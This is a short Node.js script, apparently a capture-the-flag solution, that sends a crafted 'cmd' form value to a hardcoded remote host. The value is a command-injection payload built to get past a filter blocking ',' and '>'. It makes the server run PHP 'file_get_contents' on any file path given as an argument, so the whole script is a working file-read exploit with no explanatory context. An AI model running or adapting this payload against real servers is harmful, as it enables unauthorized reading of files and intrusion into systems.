const got = require('got')
const assert = require('assert')

const HOST = 'http://120.55.43.255:22712'

const INVALID_CHARS_REGEXP = /[,>]/g

const request = (command) => {
  assert(!INVALID_CHARS_REGEXP.test(command), 'Invalid characters found')
  return got.post(`${HOST}/`, {
    form: {
      cmd: command,
    },
  })
}

;(async () => {
  const filename = process.argv.slice(2)[0]
  const command = `cut || echo "echo file_get_contents(\\"${filename}\\");"`
  const response = await request(command)
  console.log(command)
  console.log(response.body)
})()
